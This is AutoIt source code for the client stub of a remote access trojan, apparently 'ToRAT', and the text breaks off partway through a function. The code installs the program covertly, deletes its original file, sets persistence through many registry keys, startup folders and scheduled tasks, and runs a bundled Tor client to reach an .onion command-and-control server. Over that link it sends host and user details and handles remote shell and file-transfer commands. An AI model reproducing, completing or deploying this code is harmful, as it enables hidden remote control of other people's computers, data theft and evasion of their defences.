#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Compression=4
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#NoTrayIcon
Global $oErrorHandler = ObjEvent("AutoIt.Error", "_ErrFunc")
OnAutoItExitRegister("_Exit")

#Region includes

;~ #include <GUIConstantsEx.au3>
#include <Array.au3>
#include <WindowsConstants.au3>
;~ #include <GuiMenu.au3>
#include <Crypt.au3>
;~ #include <GDIPlus.au3>
;~ #include <GuiEdit.au3>
;~ #include <ButtonConstants.au3>
;~ #include <ListViewConstants.au3>
;~ #include <TabConstants.au3>
;~ #include <TreeViewConstants.au3>
;~ #include <GuiImageList.au3>
;~ #include <GuiListView.au3>
;~ #include <ComboConstants.au3>
;~ #include <StaticConstants.au3>
#include <Date.au3>
;~ #include <Inet.au3>
;~ #include <WinAPI.au3>
;~ #include <WinAPIShellEx.au3>
;~ #include <WinAPISys.au3>
;~ #include <File.au3>
;~ #include <GuiTab.au3>
#include <WinAPIRes.au3>
#include <Timers.au3>
#include <Misc.au3>


#include "Includes\ASock.au3"
#include "Includes\Base64.au3"
#include "Includes\LZNT.au3"
#include "Includes\MemoryDll.au3"
#include "Includes\SQLite.au3"
#include "Includes\TaskUDF.au3"

#EndRegion includes

#Region operation of autoit funtion/parameters

Opt("TrayIconDebug", 1)
Opt("GUIOnEventMode", 1)
Opt("TCPTimeout", 0)
Opt("MouseCoordMode", 2)

#EndRegion operation of autoit funtion/parameters

#Region declares
;~ Global $hRemoteFile ;test fileupload
Global $sVersion = "v0.2.1"

;~ Global $WS2_32 = DllOpen("Ws2_32.dll") ; Opens Ws2_32.dll to be used later. For _SocketToIP

Global $iPacketSize = 4096 ;Maximum size to receive every check

Global $hTimerMainChecks = TimerInit()
Global $hTimerLVInfoAll = TimerInit()

;~ Global $bFlagCacheSockEvents = 0
Global $bFlagVerbose = 0 ;Verbose Log off

Global $hDBConnections
Global $hQueryReadConnection
Global $hQueryLVInfo
Global $hQueryRemoteShellLoop

Global $iTorPID = -1

Global $MY_WM_USER = 0

;~ Global $iCurrentConnections = 0
Global $iConnectionCounter = 0

Global Const $sPacketLVInfo = "[PACKET_TYPE_0001]" ;sends listview infos to the CnC Server
Global Const $sPacketPing = "[PACKET_TYPE_0002]" ;Get ping over tor in ms
Global Const $sPacketSystem = "[PACKET_TYPE_0003]" ;Client restart Close etc
Global Const $sPacketUpload = "[PACKET_TYPE_0004]" ;FileUpload
Global Const $sPacketDownload = "[PACKET_TYPE_0005]" ;FileDownload
Global Const $sPacketRemoteShell = "[PACKET_TYPE_0006]" ;RemoteShell
Global Const $sPacketDivider = "[PACKET_SPLIT]" ; Defines where to split sections of a packet
Global Const $sPacketEND = "[PACKET_END]" ; Defines the end of a packet
#EndRegion declares

#Region Create DB
_SQLite_Startup()
$hDBConnections = _SQLite_Open()
_SQLite_Exec($hDBConnections, "CREATE TABLE tblConnections (SocketID, SocketNo, ConnectionNo, TorConnected, RecvBuffer BLOB, SendBuffer BLOB);")
#EndRegion Create DB

#Region builder vars

Global $sMutex = "", $sClientTag = "", $sIcon = "" ;General
Global $aOnionSockets, $sOnionSocket = StringStripWS(FileRead(@ScriptDir & "\System\Tor\Hidden_Service\hostname"),8) & ":" & "1594" ;Connection
Global $iInstall = 0, $iStartup = 0, $sInstallLocation = "", $sInstallPath = "", $iPersistence = 0, $iMelt = 0, $iRemoveIcon = 0, $iBypassUAC = 0, $iDelay = 0, $sDelay = "" ;Install
Global $iHKCURun = 0, $sHKCURun = "", $iHKCULoad = 0, $iStartupDir = 0, $sStartupDir = "", $iTaskScheduler = 0, $sTaskScheduler = "", $iHKCUPolicies = 0, $sHKCUPolicies = "", $iHKLMPolicies = 0, $sHKLMPolicies = "", $iHKLMActivX = 0, $sHKLMActivX = "";Install
Global $iHKLMRun = 0, $sHKLMRun = "", $iHKLMUserInit = 0, $iAllStartupDir = 0, $sAllStartupDir = "", $iAdminTaskScheduler = 0, $sAdminTaskScheduler = "" ;Install
;~ Global ;Keylogger
Global $iEoF = 0, $iResource = 0;CreateClient

Global $iConcurrentConnections = 1
Global $sInstallFullPath = ""

$aOverlayInfo = _PEFileGetOverlayInfo(@AutoItExe)

$hStub = FileOpen(@AutoItExe, 16)

If $aOverlayInfo[1] = 0 Then ;if no eof exists
	$hInstance = _WinAPI_LoadLibraryEx(@AutoItExe, $LOAD_LIBRARY_AS_DATAFILE)
	$hResource = _WinAPI_FindResource($hInstance, 10, "Settings")
	If $hResource Then
		$iSize = _WinAPI_SizeOfResource($hInstance, $hResource)
		$hData = _WinAPI_LoadResource($hInstance, $hResource)
		$pData = _WinAPI_LockResource($hData)
		$tData = DllStructCreate('byte[' & $iSize & ']', $pData)
		$dBuilderEncrypted = BinaryToString(DllStructGetData($tData, 1))
		_WinAPI_FreeLibrary($hInstance)
		FillSettings($dBuilderEncrypted)
	Else
;~ 		MsgBox(0, "Error", "This Stub has no Settings")
		$hFile = FileOpen(@ScriptDir & "\TestRCDATA", 16)
		$dBuilderEncrypted = FileRead($hFile)
		FillSettings($dBuilderEncrypted)
;~ 		Exit
	EndIf
Else ;we have eof
	FileSetPos($hStub, $aOverlayInfo[0], 0)
	$dBuilderEncrypted = BinaryToString(FileRead($hStub, $aOverlayInfo[1]))
	FillSettings($dBuilderEncrypted)
EndIf

Func FillSettings($dBuilderEncrypted)
	$bBuilderDecrypted = _Crypt_DecryptData($dBuilderEncrypted, "LSAfoo93n.-,�dd2", $CALG_RC4)
	$sBuilderDecrypted = BinaryToString($bBuilderDecrypted)
	$aBuilder = StringSplit($sBuilderDecrypted, "---Builder---", 1)

	If IsArray($aBuilder) And UBound($aBuilder) >= 3 Then
		$sBuilder = $aBuilder[2]

		$aBuilderGeneral = StringSplit($sBuilder, "---General---", 1)
		$aBuilderConnection = StringSplit($sBuilder, "---Connection---", 1)
		$aBuilderInstall = StringSplit($sBuilder, "---Install---", 1)
		$aBuilderKeylogger = StringSplit($sBuilder, "---Keylogger---", 1)
		$aBuilderCreate = StringSplit($sBuilder, "---Create---", 1)

		$sBuilderGeneral = $aBuilderGeneral[2]
		$sBuilderConnection = $aBuilderConnection[2]
		$sBuilderInstall = $aBuilderInstall[2]
		$sBuilderKeylogger = $aBuilderKeylogger[2]
		$sBuilderCreate = $aBuilderCreate[2]

		$aBuilderGeneral = StringSplit($sBuilderGeneral, "|")
		$aBuilderConnection = StringSplit($sBuilderConnection, "|")
		$aBuilderInstall = StringSplit($sBuilderInstall, "|")
		$aBuilderKeylogger = StringSplit($sBuilderKeylogger, "|")
		$aBuilderCreate = StringSplit($sBuilderCreate, "|")

		$sMutex = $aBuilderGeneral[1]
		$sClientTag = $aBuilderGeneral[2]
		$sIcon = $aBuilderGeneral[3]

		$sOnionSocket = $aBuilderConnection[1]
		$aOnionSockets = StringSplit($sOnionSocket, ",")
		$iConcurrentConnections = $aOnionSockets[0]

		$iInstall = $aBuilderInstall[1]
		$iStartup = $aBuilderInstall[2]
		$sInstallLocation = $aBuilderInstall[3]
		$sInstallPath = $aBuilderInstall[4]
		$iPersistence = $aBuilderInstall[5]
		$iMelt = $aBuilderInstall[6]
		$iRemoveIcon = $aBuilderInstall[7]
		$iBypassUAC = $aBuilderInstall[8]
		$iDelay = $aBuilderInstall[9]
		$sDelay = $aBuilderInstall[10]
		$iHKCURun = $aBuilderInstall[11]
		$sHKCURun = $aBuilderInstall[12]
		$iHKCULoad = $aBuilderInstall[13]
		$iStartupDir = $aBuilderInstall[14]
		$sStartupDir = $aBuilderInstall[15]
		$iTaskScheduler = $aBuilderInstall[16]
		$sTaskScheduler = $aBuilderInstall[17]
		$iHKCUPolicies = $aBuilderInstall[18]
		$sHKCUPolicies = $aBuilderInstall[19]
		$iHKLMPolicies = $aBuilderInstall[20]
		$sHKLMPolicies = $aBuilderInstall[21]
		$iHKLMActivX = $aBuilderInstall[22]
		$sHKLMActivX = $aBuilderInstall[23]
		$iHKLMRun = $aBuilderInstall[24]
		$sHKLMRun = $aBuilderInstall[25]
		$iHKLMUserInit = $aBuilderInstall[26]
		$iAllStartupDir = $aBuilderInstall[27]
		$sAllStartupDir = $aBuilderInstall[28]
		$iAdminTaskScheduler = $aBuilderInstall[29]
		$sAdminTaskScheduler = $aBuilderInstall[30]

		$iEoF = $aBuilderCreate[1]
		$iResource = $aBuilderCreate[2]
	EndIf
EndFunc   ;==>FillSettings

;--------------
;~ Global $sClientTag = "TestClient"

Global $sTorFileName = "Tor.exe"
Global $hTimerConnect[$iConcurrentConnections]
Global $hTimerLVInfo[$iConcurrentConnections]
Global $hTimerPing[$iConcurrentConnections]
Global $aOnion[$iConcurrentConnections]
Global $aOnionPort[$iConcurrentConnections]

Global $iRemoteShellPID[$iConcurrentConnections]
Global $iRemoteShellCtrlc[$iConcurrentConnections]
Global $iRemoteShellRunning[$iConcurrentConnections]
Global $sRemoteShellCommand[$iConcurrentConnections]
Global $sRemoteShellOutput[$iConcurrentConnections]
Global $sRemoteShellOutputError[$iConcurrentConnections]
Global $hTimerRemoteShellRunning[$iConcurrentConnections]
Global $iRemoteShellAliveCheck[$iConcurrentConnections]

Global $sSocksAddress = "127.0.0.1"
Global $iSocksPort = 9050


For $i = 0 To $iConcurrentConnections -1
	$aOnionSocket = StringSplit($aOnionSockets[$i+1], ":")
	$aOnion[$i] = $aOnionSocket[1]
	$aOnionPort[$i] = $aOnionSocket[2]

;~ 	$aOnion[$i] = StringStripWS(FileRead(@ScriptDir & "\System\Tor\Hidden_Service\hostname"),8) ;if u started the CnC server first (ToRAT.au3/exe) onion address gets read automaticaly
;~ 	$aOnionPort[$i] = 1594
	_SQLite_Exec($hDBConnections, "Insert into tblConnections values (" & $i & ", -1, Null, Null, Null, Null);")

	$hTimerConnect[$i] = 10000 ;variable wenn eingestellt benutzen
	$hTimerLVInfo[$i] = 10000 ;variable wenn eingestellt benutzen
	$hTimerPing[$i] = 0

	$iRemoteShellCtrlc[$i] = 0
	$iRemoteShellRunning[$i] = 0
	$sRemoteShellCommand[$i] = 0
	$iRemoteShellAliveCheck[$i] = 300000
	$hTimerRemoteShellRunning[$i] = $iRemoteShellAliveCheck[$i]
Next

#EndRegion builder vars

#Region global scope

Mutex()

$hNtdll=DLlOpen("ntdll.dll")
DllCall("kernel32.dll", "int", "Wow64DisableWow64FsRedirection", "int", 1) ;um richtigen system32 ordner zu sehen nicht wow64

If $iInstall = 1 Then InstallServer()
If $iStartup = 1 Then ServerStartup()

TCPStartup() ; Starts up TCP

$hGUINotifyASock = GUICreate("Dummy Notify ASock Window")

While 1
	_HighPrecisionSleep(1000,$hNtdll)


	If TimerDiff($hTimerMainChecks) >= 10000 Then ; variable für zeit einstellen
		_ShowSqlTbl($hDBConnections, "tblConnections") ;debug
		$hTimerMainChecks = TimerInit()
	EndIf

	StartConnecting() ;to local tor Socks Proxy 127.0.0.1:9050


	;If we have no connections we continue loop
;~ 	If $iCurrentConnections < 1 Then
;~ 		ContinueLoop
;~ 	EndIf

	;we have connections...
	ReadConnection() ;check received data manualy. we dont use the asock events for good reason

	RemoteShellLoop()

	If TimerDiff($hTimerLVInfoAll) >= 10000 Then ;hier den kleinsten timer interval von allen ermitteln und einstellen
		RefreshLVInfo()
		$hTimerLVInfoAll = TimerInit()
	EndIf

WEnd

#EndRegion global scope

#Region on start functions

Func Mutex()
	If $sMutex = "" Then Return
	$iSingleton = _Singleton($sMutex, 1)
	If $iSingleton = 0 Then
		Sleep(5000) ;we wait 5 more sec to give other stub time to exit in case of clientupdate
		$iSingleton = _Singleton($sMutex, 1)
		If $iSingleton = 0 Then
			Exit
		EndIf
	EndIf
EndFunc

Func InstallServer()
	Switch $sInstallLocation
		Case "@AppDataDir"
			$sInstallLocation = @AppDataDir
		Case "@LocalAppDataDir"
			$sInstallLocation = @LocalAppDataDir
		Case "@TempDir"
			$sInstallLocation = @TempDir
	EndSwitch

	$aInstallPath = StringSplit($sInstallPath, "\")
	$sInstallDir = $aInstallPath[1]
	$sInstallFile = $aInstallPath[2]
	$sInstallFullPath = $sInstallLocation & "\" & $sInstallDir & "\" & $sInstallFile

	If @AutoItExe = $sInstallFullPath Then ;already installed
		Return
	Else
		FileCopy(@AutoItExe, $sInstallFullPath, 9)
		;hier icon entfernen
		If $iRemoveIcon = 1 Then ;remove icon when install
			Local $iError = 1
			Do
				; Begin update resources
				Local $hUpdate = _WinAPI_BeginUpdateResource($sInstallFullPath)
				If @error Then
					ExitLoop
				EndIf
				;del icon group
				If Not _WinAPI_UpdateResource($hUpdate, $RT_GROUP_ICON, 'MAINICON', 0, 0, 0) Then
					ExitLoop
				EndIf
				;del icons
				$aIconCount = _WinAPI_EnumResourceNames($sInstallFullPath, $RT_ICON)
				For $i = 1 To $aIconCount[0]
					If Not _WinAPI_UpdateResource($hUpdate, $RT_ICON, $i, 0, 0, 0) Then
						ExitLoop 2
					EndIf
				Next

				$iError = 0
			Until 1

			; Save or discard changes of the resources within an executable file
			If Not _WinAPI_EndUpdateResource($hUpdate, $iError) Then
				$iError = 1
			EndIf
		EndIf
		$iNewPID = Run($sInstallFullPath, $sInstallLocation & "\" & $sInstallDir)
		If @error Then
			SetError(1)
			Return
		Else
			If ProcessExists($iNewPID) Then
				;melt server
				If $iMelt = 1 Then
					Local $sCmdFile
					FileDelete(@TempDir & "\melt.bat")
					$sCmdFile = ':loop' & @CRLF _;'ping -n ' & $iDelay & '127.0.0.1 > nul' & @CRLF _
							 & 'del "' & @ScriptFullPath & '"' & @CRLF _
							 & 'if exist "' & @ScriptFullPath & '" goto loop' & @CRLF _
							 & 'del ' & @TempDir & '\melt.bat'
					FileWrite(@TempDir & "\melt.bat", $sCmdFile)
					Run(@TempDir & "\melt.bat", @TempDir, @SW_HIDE)
					Exit
				Else
					Exit
				EndIf
			Else
				SetError(2)
				Return
			EndIf
		EndIf
	EndIf
EndFunc   ;==>InstallServer

Func ServerStartup()
	Local $iTaskerror = 0
	Local $iTaskCount = ""
	Local $iTaskerrorAdmin = 0
	Local $iTaskCountAdmin = ""
	If $iHKCURun = 1 Then RegWrite("HKCU\SOFTWARE\microsoft\windows\currentversion\run", $sHKCURun, "REG_SZ", $sInstallFullPath)
	If $iHKCULoad = 1 Then RegWrite("HKCU\SOFTWARE\microsoft\windows NT\currentversion\windows", "load", "REG_SZ", $sInstallFullPath)
	If $iStartupDir = 1 Then FileCreateShortcut($sInstallFullPath, @StartupDir & "\" & $sStartupDir)
	Do
;~ 		If $iTaskScheduler = 1 Then _TaskCreate($sTaskScheduler & $iTaskCount, "", 2, "2011-03-30T08:00:00", "2111-03-30T08:00:00", "", "", "", "", "", "PT1M", True, 3, 0, "", "", $sInstallFullPath, "", "", True, "", 2)
		If $iTaskScheduler = 1 Then _TaskCreate($sTaskScheduler & $iTaskCount, "", 2, "2011-03-30T08:00:00", "2111-03-30T08:00:00", "", "", "", "", "", "", True, 3, 0, "", "", $sInstallFullPath, "", "", True, "", 2)
			If @error Then
				$iTaskerror = 1
				$iTaskCount += 1
			Else
				$iTaskerror = 0
			EndIf
	Until $iTaskerror = 0 Or $iTaskCount > 100

	If IsAdmin() Then
		If $iHKCUPolicies = 1 Then RegWrite("HKCU\SOFTWARE\microsoft\windows\currentversion\Policies\explorer\run", $sHKCUPolicies, "REG_SZ", $sInstallFullPath)
		If $iHKLMPolicies = 1 Then RegWrite("HKLM\SOFTWARE\microsoft\windows\currentversion\Policies\explorer\run", $sHKLMPolicies, "REG_SZ", $sInstallFullPath)
		If $iHKLMActivX = 1 Then
			RegWrite("HKLM\SOFTWARE\microsoft\Active Setup\Installed Components\" & $sHKLMActivX, "StubPath", "REG_SZ", $sInstallFullPath)
			RegDelete("HKCU\SOFTWARE\microsoft\Active Setup\Installed Components\" & $sHKLMActivX)
		EndIf
		If $iHKLMRun = 1 Then RegWrite("HKLM\SOFTWARE\microsoft\windows\currentversion\run", $sHKLMRun, "REG_SZ", $sInstallFullPath)
		If $iHKLMUserInit = 1 Then
			Global $sDefaultUserInitKey = RegRead("HKLM\SOFTWARE\microsoft\windows NT\currentversion\winlogon", "userinit") ;global to remake changes when uninstall client
			RegWrite("HKLM\SOFTWARE\microsoft\windows NT\currentversion\winlogon", "userinit", "REG_SZ", $sDefaultUserInitKey & "," & $sInstallFullPath)
		EndIf

		If $iAllStartupDir = 1 Then FileCreateShortcut($sInstallFullPath, @StartupCommonDir & "\" & $sAllStartupDir)
		Do
			If $iAdminTaskScheduler = 1 Then _TaskCreate($sAdminTaskScheduler & $iTaskCountAdmin, "", 2, "2011-03-30T08:00:00", "2111-03-30T08:00:00", "", "", "", "", "", "", True, 3, 1, "", "", $sInstallFullPath, "", "", True, "", 2)
				If @error Then
					$iTaskerrorAdmin = 1
					$iTaskCountAdmin += 1
				Else
					$iTaskerrorAdmin = 0
				EndIf
		Until $iTaskerrorAdmin = 0 Or $iTaskCountAdmin > 100
	Else
;~ 		If $BypassUAC = 1 Then UACbypass()
	EndIf
EndFunc   ;==>ServerStartup

#EndRegion on start functions

#Region Connection funtions

Func StartConnecting()
	StartTor()
	Local $aRow
	For $i = 0 To $iConcurrentConnections -1 ;Try to connect to every address defined in builder
		_SQLite_QuerySingleRow($hDBConnections, "SELECT SocketNo FROM tblConnections WHERE SocketID = " & $i & ";", $aRow) ;get SocketNo from SocketID
		If $aRow[0] = -1 Then
			If TimerDiff($hTimerConnect[$i]) >= 10000 Then ;give time that the event sets "$aConnectingAddress[$i][$sConnectingSocket]" to -1 if we got no connection ;variable für zeit einstellen aber nie kleiner als 10 sec
				ConsoleWrite("+> $aRow[0]: " & $aRow[0] & @CRLF)
				$hTimerConnect[$i] = TimerInit()
				$iSocket = _ASocket()
				If @error Then
					ConsoleWrite("!> Socket creation failed." & @CRLF)
					Return
				EndIf
				ConsoleWrite("+> $iSocket: " & $iSocket & @CRLF)

				$MY_WM_USER = $WM_USER + $i
				_ASockSelect($iSocket, $hGUINotifyASock, $MY_WM_USER, BitOR($FD_READ, $FD_WRITE, $FD_CONNECT, $FD_CLOSE))
				If @error Then ConsoleWrite("!> $iSocket: " & $iSocket & "error asockselect" & @CRLF)
				GUIRegisterMsg($MY_WM_USER, "OnSocketEvent")

				_ASockConnect($iSocket, TCPNameToIP($sSocksAddress), $iSocksPort)
				If @error Then ConsoleWrite("!> $iSocket: " & $iSocket & "error asockconnect" & @CRLF)
			EndIf
		EndIf
	Next
EndFunc

Func TorConnect($iSocket, $iSocketID, $sCurrentOnion)
	Local $aRow
		_SQLite_QuerySingleRow($hDBConnections, "SELECT TorConnected FROM tblConnections WHERE SocketID = " & $iSocketID & ";", $aRow) ;get TorConnected from SocketID
		If $aRow[0] = "" Then
			If $iSocket = "" Then
				ConsoleWrite("! tor keine verbindung i: " & $i & @CRLF)
			Else
				$HexPort1 = StringLeft(Hex($aOnionPort[$iSocketID], 4), 2)
				$HexPort2 = StringRight(Hex($aOnionPort[$iSocketID], 4), 2)

				$sReq = Chr(0x04) _ 											; Protocol version	4
						 & Chr(0x01) _ 											; Command Code		1 - establish a tcp/ip stream connection
						 & Chr("0x" & $HexPort1) & Chr("0x" & $HexPort2) _ 		; Port				in Hex
						 & Chr(0x00) & Chr(0x00) & Chr(0x00) & Chr(0xFF) _ 		; Ip Adress			Invalid - 0.0.0.255
						 & "" & Chr(0x00) _ 									; User Id			Empty
						 & $sCurrentOnion & Chr(0x00) 							; Host Name			*.onion

				; Send Request to Proxy
				ConsoleWrite("! Request: " & Hex(Binary($sReq)) & @CRLF)
				_Send($iSocket, Binary($sReq))

				_SQLite_Exec($hDBConnections, "UPDATE tblConnections SET TorConnected=1 WHERE SocketID=" & $iSocketID & ";") ;write TorConnected to DB
				SendLVInfo($iSocket, "True") ;send LV infos
			EndIf
		EndIf
EndFunc

Func StartTor()
	While 1
		If $iTorPID = -1 Then
			If FileExists(@ScriptDir & "\TorClient\Tor.pid") Then
				$iTorPID = StringStripWS(FileRead(@ScriptDir & "\TorClient\Tor.pid"),8)
				ExitLoop ;tor already running
			EndIf
		Else
			If ProcessExists($iTorPID) Then ExitLoop ;tor running everything fine
;~ 			_InstallTor()
			$iSocksPort += 1 ;tor got closed try next port
		EndIf

		_InstallTor()

		 ;configure and start tor
		$hFile = FileOpen(@ScriptDir & "\TorClient\TorConfig", 10)
		FileWrite($hFile, "DataDirectory " & @ScriptDir & "\TorClient\TorData" & @CRLF & "SocksListenAddress 127.0.0.1" & @CRLF & "SocksPort " & $iSocksPort & @CRLF & "PidFile " & @ScriptDir & "\TorClient\Tor.pid" & @CRLF)
		FileClose($hFile)
		$iTorPID = ShellExecute(@ScriptDir & "\TorClient\" & $sTorFileName, "-f TorConfig", @ScriptDir & "\TorClient")
	WEnd
EndFunc

Func OnSocketEvent($hWnd, $iMsgID, $WParam, $LParam)
	Local $aRow
    Local $hSocket = $WParam; Get the socket involved (either $hListen or $hAccepted in this example)
	Local $iSocketID = $iMsgID - $WM_USER
    Local $iError = _HiWord( $LParam ); If error is 0 then the event indicates about a success
    Local $iEvent = _LoWord( $LParam ); The event: incoming conn / data received / perfect conditions to send / conn closed
    If $iMsgID >= $WM_USER And $iMsgID < $MY_WM_USER +1 Then; Winsock, not Windows GDI
        Switch $iEvent
			Case $FD_CONNECT
				If $iError <> 0 Then
					ConsoleWrite("Error connecting on socketID #" & $iSocketID & "... :(" & @CRLF)
					$iSocket = Dec(StringTrimLeft($hSocket,2))
					CloseConnection($iSocket)
					_ShowSqlTbl($hDBConnections, "tblConnections")
				Else; Yay, connected!
					$iSocket = Dec(StringTrimLeft($hSocket,2))
					_SQLite_QuerySingleRow($hDBConnections, "SELECT SocketNo FROM tblConnections WHERE SocketID = " & $iSocketID & ";", $aRow) ;get SocketNo from SocketID
					If $aRow[0] = -1 Then
						ConsoleWrite("+> Connected on SocketID #" & $iSocketID & " (SocketNo was -1 now: " & $iSocket & ")" & @CRLF)
						AcceptedConnection($iSocket, $iSocketID)
					Else
						ConsoleWrite("!> Connected on SocketID #" & $iSocketID & " (SocketNo was: " & $aRow[0] & " now: " & $iSocket & ")" & @CRLF)
						ConsoleWrite("!> Closing and not accepting the new one" & @CRLF)
						CloseConnection($iSocket)
					EndIf

				EndIf
            Case $FD_READ; Data has arrived! ;we dont wanna get here everytime data arrives cause if to much data arrives the script may seem hanging and "forgets" to do importent other stuff in time. we check manualy in main loop
                If $iError <> 0 Then
;~                     ConsoleWrite("socketID: " & $iSocketID & " FD_READ was received with the error value of " & $iError & "." & @CRLF)
                Else
;~ 					ConsoleWrite( $iSocketID & " FD_READ " & @CRLF)
                EndIf
            Case $FD_WRITE ;ready to send stuff. how ever we can just send when ever we want
                If $iError <> 0 Then
;~                     ConsoleWrite("socketID: " &  $iSocketID & " FD_WRITE was received with the error value of " & $iError & "." & @CRLF)
				Else
;~ 					ConsoleWrite( $iSocketID & " FD_WRITE " & @CRLF)
                EndIf
            Case $FD_CLOSE; Bye bye
				$iSocket = Dec(StringTrimLeft($hSocket,2))
				ConsoleWrite( "Connection was closed on SocketNo: " & $iSocket & "." & @CRLF)
				ConsoleWrite( "Connection was closed on socketID: " & $iSocketID & "." & @CRLF)
				CloseConnection($iSocket)
        EndSwitch
    EndIf
EndFunc

Func AcceptedConnection($iSocket, $iSocketID)
	; Save the socket number, connection count number in the DB table tblConnections
	$Result = _SQLite_Exec($hDBConnections, "UPDATE tblConnections SET SocketNo=" & $iSocket & ", ConnectionNo=" & $iConnectionCounter & " WHERE SocketID=" & $iSocketID & ";") ;write SocketNo to DB
	If $Result <> $SQLITE_OK Then ConsoleWrite("!> $iSocket: " & $iSocket & "Result accepted: " & $Result & @CRLF)
	If $Result = $SQLITE_OK Then
		$iConnectionCounter += 1 ;counts all connections that were established
;~ 		$iCurrentConnections += 1 ;counts only current established connections
		TorConnect($iSocket,$iSocketID, $aOnion[$iSocketID]) ;to *.onion (CnC Server)
	EndIf
EndFunc

Func CloseConnection($iSocket)
	_ASockShutdown($iSocket); Graceful shutdown.
	; set SocketNo to -1 again to start connection tries again
	_SQLite_Exec($hDBConnections, "UPDATE tblConnections SET SocketNo=-1, ConnectionNo=Null, ConnectionNo=Null, TorConnected=Null, RecvBuffer=Null, SendBuffer=Null WHERE SocketNo=" & $iSocket & ";") ;write SocketNo to DB
EndFunc

Func ReadConnection()
	Local $aRow
	Local $sRecvBuffer = ""
	_SQLite_Query($hDBConnections, "SELECT SocketNo FROM tblConnections;", $hQueryReadConnection) ;get SocketNo
	While _SQLite_FetchData($hQueryReadConnection, $aRow, False, False) = $SQLITE_OK ; Read Out the next Row
		_HighPrecisionSleep(1000,$hNtdll)
		$sRecvData = TCPRecv($aRow[0], $iPacketSize)
		If @error Then
			$iError = @error
			If $iError <> 10035 Then
				CloseConnection($aRow[0])
				ContinueLoop
			Else
				ConsoleWrite("Recv Error: " & $iError & @CRLF)
			EndIf
		EndIf

		If $sRecvData <> "" Then ; If we got data
			$sRecvBuffer = _WriteBuffer($sRecvData, $aRow[0])
		EndIf

		If StringInStr($sRecvBuffer, "[PACKET_TYPE_") And Not StringInStr($sRecvBuffer, $sPacketEND) Then
			Local $hTimerLoop = TimerInit() ;Timer to exit loop so the userinputs dont get "blocked" or gui seems "freezed"
			Do
				$sRecvData = TCPRecv($aRow[0], $iPacketSize)
				If @error Then
					$iError = @error
					If $iError <> 10035 Then
						CloseConnection($aRow[0])
						ContinueLoop(2)
					Else
						ConsoleWrite("Recv Error: " & $iError & @CRLF)
					EndIf
				EndIf

				If $sRecvData <> "" Then ; If we got data
					$sRecvBuffer = _WriteBuffer($sRecvData, $aRow[0])
				EndIf

			Until $sRecvData = "" Or TimerDiff($hTimerLoop) >= 500 ;Timer to exit loop so the userinputs dont get "blocked" or gui seems "freezed" ;variable für zeit einstellen sollte nicht zu groß sein wegen laggs
		EndIf

		While StringInStr($sRecvBuffer, $sPacketEND)
			Local $sRawPackets = $sRecvBuffer ; Transfer all the data we have to a new variable.
;~ 			ConsoleWrite(">> Raw Data1: " & $sRawPackets & @CRLF)
			Local $sFirstPacketLength = StringInStr($sRawPackets, $sPacketEND) - 30 ; Get the length of the packet, and subtract the length of the prefix/suffix.
			Local $sPacketType = StringLeft($sRawPackets, 18) ; Copy the first 18 characters, since that is where the packet type is put.
			If StringInStr($sPacketType,"[PACKET_TYPE_") Then
			Else
				$sRawPackets = StringTrimLeft($sRawPackets, 18) ;if its TorSocksProxy data ignore it (also 18 what a fluke)
				$sFirstPacketLength = StringInStr($sRawPackets, $sPacketEND) - 30 ; Get the length of the packet, and subtract the length of the prefix/suffix.
				$sPacketType = StringLeft($sRawPackets, 18) ; Copy the first 18 characters, since that is where the packet type is put.
			EndIf
			Local $sCompletePacket = StringMid($sRawPackets, 19, $sFirstPacketLength + 11) ; Extract the packet.
			Local $sPacketsLeftover = StringTrimLeft($sRawPackets, $sFirstPacketLength + 41) ; Trim what we are using, so we only have what is left over. (any incomplete packets)
			$sRecvBuffer = _ClearAndWriteBuffer($sPacketsLeftover, $aRow[0])  ; Transfer any leftover packets back to the buffer.
			; Writes some stuff to the console for debugging.
			ConsoleWrite(">> Raw Data Size: " & StringLen($sRawPackets) & @CRLF)
;~ 			ConsoleWrite(">> Raw Data2: " & $sRawPackets & @CRLF)
			ConsoleWrite(">> Full packet found! Size: " & StringLen($sCompletePacket) & @CRLF)
			ConsoleWrite("+> Type: " & $sPacketType & @CRLF)
			If StringLen($sCompletePacket) <= 70 Then
				ConsoleWrite("+> Packet: " & $sCompletePacket & @CRLF)
			Else
				ConsoleWrite("+> Packet: " & StringLeft($sCompletePacket, 80) & "[...]" & @CRLF)
			EndIf
			If StringLen($sRecvBuffer) <= 70 Then
				ConsoleWrite("!> Left in buffer: " & $sRecvBuffer & @CRLF & @CRLF)
			Else
				ConsoleWrite("!> Left in buffer: " & StringLeft($sRecvBuffer, 80) & "[...]" & @CRLF & @CRLF)
			EndIf
			; Since we extracted a packet, we will send it to the processor.
			ProcessFullPacket($sCompletePacket, $sPacketType, $aRow[0])
		WEnd
	WEnd
	_SQLite_QueryFinalize($hQueryReadConnection)
EndFunc

Func ProcessFullPacket($sCompletePacket,$sPacketType, $iSocket)
	Switch $sPacketType
		Case $sPacketLVInfo ;um später die refreshtime anzupassen
			LVinfo($sCompletePacket, $iSocket)
		Case $sPacketPing
			PingPong($sCompletePacket, $iSocket)
		Case $sPacketSystem
			SystemCMD($sCompletePacket, $iSocket)
		Case $sPacketUpload
			FileUploading($sCompletePacket, $iSocket)
		Case $sPacketRemoteShell
			RemoteShell($sCompletePacket, $iSocket)
	EndSwitch
EndFunc

Func LVinfo($sCompletePacket, $iSocket)
	If $sCompletePacket = "GetLVInfos" Then
		SendLVInfo($iSocket, "True") ;send LV infos
	EndIf
EndFunc

Func RefreshLVInfo()
	Local $aRow
	$i = 0
	_SQLite_Query($hDBConnections, "SELECT SocketNo FROM tblConnections;", $hQueryLVInfo) ;get SocketNo
	While _SQLite_FetchData($hQueryLVInfo, $aRow, False, False) = $SQLITE_OK ; Read Out the next Row
		If TimerDiff($hTimerLVInfo[$i]) >= 10000 Then ;variable für zeit einstellung
			$hTimerLVInfo[$i] = TimerInit()
			If $aRow[0] = -1 Then
				$i += 1
				ContinueLoop
			EndIf
			SendLVInfo($aRow[0])
		EndIf
		$i += 1
	WEnd
	_SQLite_QueryFinalize($hQueryLVInfo)
EndFunc

Func SendLVInfo($iSocket, $sFlagNewConnection = "False")
	Local $aRow
	If $sFlagNewConnection = "True" Then ;if its a new connection send all LVinfos
		$sPCName = @ComputerName
		If IsAdmin() Then
			$sUserName = @UserName & "*"
		Else
			$sUserName = @UserName
		EndIf
		$sOS = _getOSVersion() & " " & @OSArch ;wmi methode. we can also use intern autoit function here
		$sOSLang = @OSLang

